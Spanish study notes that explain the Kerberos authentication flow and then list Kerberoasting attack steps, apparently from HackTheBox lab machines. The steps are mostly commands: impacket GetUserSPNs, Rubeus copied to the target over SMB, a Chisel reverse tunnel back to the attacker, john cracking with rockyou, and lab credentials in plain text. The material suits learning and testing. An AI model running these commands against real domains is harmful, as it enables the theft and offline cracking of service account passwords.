Kerberos -->  protocolo de autenticación de redes, permite a los clientes 			demostrar su identidad.

** Funcionamiento **
![[Pasted image 20210714193509.png]]
1.- Usuario introduce nombre/contraseña --> genera una clave secreta hash
2.- Usuario solicita servicio "Kerberos" a AS.
3.- AS comprueba usuario en su base de datos y genera has con su password. 
> Envía:
> A --> Client/TGS session key cifrada usando la clave securizada del usuario.
> B --> Ticket-Granting ticket (ID cliente, dirección de red, validez y client/TGS key) con doble cifrado TGS

4.- Cliente descifra mensaje A y parcialmente mensaje B ( no puede descifrar el TGT).
5.- Cliente envía al TGS:
> C --> El Ticket-Granting ticket del mensaje B y el ID del servicio solicitado.
> D --> Autenticador (ID cliente + marca de tiempo) cifrado con el client/TGS key.

6.- TGS envía al cliente:
> E --> Client-to-server ticket (ID cliente, dirección de red, validez y cliente/server_session key), cifrado con clave usuario.
> F --> Client/server sesion key cifrada con client/TGS session key.

7.- Cliente recibe mensajes E y F, puede autenticarse contra el SS. Se conecta al SS y envía:
> E --> Mensaje del paso anterior.
> G --> Autenticador ( ID cliente + marca de tiempo) cifrado con client/server session key.

8.- El SS descifra el ticket usando su clave secreta y envía al cliente:
> H --> Marca de tiempo + 1 y cifrado el client/server session key.

** Kerberoasting Attack (Simple) **
Ataque sobre servicio Kerberos con credenciales válidas.
> Sincronización con el servidor.
> `rdate -n 10.10.10.100`
> Obtener TGS (Ticket Granting Service) del usuario.
> `GetUserSPNs.py active.htb/SVC_TGS:GPPStillStandingStrong2K18 -dc-ip 10.10.10.100 -request`
> Crackear el hash del TGS
> `john --wordlist=rockyou.txt hash`

** Pasos de ataque a Kerberos **
Utilizar los tickets para realizar cracking sobre las contraseñas de manera offline.
> Ver puertos abiertos:
> `netstat -ap tcp`
> Descargar Rubeus: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
> Pasar rubeus.exe a máquina objetivo:
> Montar directorio compartido por SMB:
> `impacket-smbserver smbFolder $(pwd) -smb2support -username s4vitar -password s4vitar`
> Tranferir rubeus.exe:
> `net user \\10.10.14.6\smbFolder /u:s4vitar s4vitar`
> `copy \\10.10.14.6\smbFolder\rubeus.exe C:\Users\amanda\appdata\local\temp\rubeus.exe`
> Ejecutar Rubeus:
> `rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972`
> Utilizar rutas absolutas si no funciona.
> Obtenemos el server ticket, con el cual se podrá obtener el hash NTML de la cuenta asociada al servicio de dominio.


** Transferir Ticket gracias a Remote Port Forwarding con Chisel ** 
> Descargar releases para Linux y WIndows (amd64): https://github.com/jpillora/chisel/releases
> Transferir "chisel_windows_amd64" a la máquina objetivo ya descomprimido:
> `gunzip chisel_windows_amd64.exe.gz`
> `impacket-smbserver smbFolder $(pwd) -smb2support -username s4vitar -password s4vitar`
> `copy \\10.10.14.6\smbFolder\chisel_windows_amd64.exe C:\Windows\Temp`
> Crear Port Forwarding.
> Montar servidor Chisel en máquina atacante:
> `./chisel_linux_amd64 server -p 8008 --reverse`
> Montar cliente Chisel en máquina objetivo:
> `C:\Windows\Temp\chisel_windows_amd64.exe client 10.10.14.6:8008 R:88:127.0.0.1:88 R:389:localhost:389`
> Comprobar Port Forwarding en máquina atacante:
> `netsat -nat | grep "88"`
> Transferir Ticket para hacer kerberoasting:
> `impacket-GetUserSPns -request -dc -ip 127.0.0.1 htb.local/amanda -save -outfile GetUserSPNs.out`
> Obtenemos ticket, que habrá que tratarlo y crackearlo.


** Tratar el hash obtenido con el ataque kerberoasting **
> Quitamos los saltos de línea y espacios:
> `cat hash | sed 's/^*//' | tr -d '\n'; echo`
> Crackeamos el hash:
> `john --wordlist=rockyou.txt hash`
> Comprobar si es válido con CME:
> `cme smb 10.10.10.103 -u 'mrlky' -p 'Football#7'`